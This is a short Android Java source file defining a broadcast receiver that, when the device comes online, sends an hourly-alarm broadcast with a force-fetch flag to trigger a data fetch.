package com.xstd.plugin.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.plugin.config.Config;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-11-19
 * Time: PM5:37
 * To change this template use File | Settings | File Templates.
 */
public class NetworkBroadcastReceiver extends BroadcastReceiver {

    public void onReceive(Context context, Intent intent) {
        if (intent != null && UtilsRuntime.isOnline(context)) {
            if (Config.DEBUG) {
                Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] try to send broadcast : " + ScreenBRC.HOUR_ALARM_ACTION + " >>>>>");
            }

            Intent i = new Intent();
            i.setAction(ScreenBRC.HOUR_ALARM_ACTION);
            i.putExtra(ScreenBRC.KEY_FORCE_FETCH, true);
            context.sendBroadcast(i);
        }
    }

}
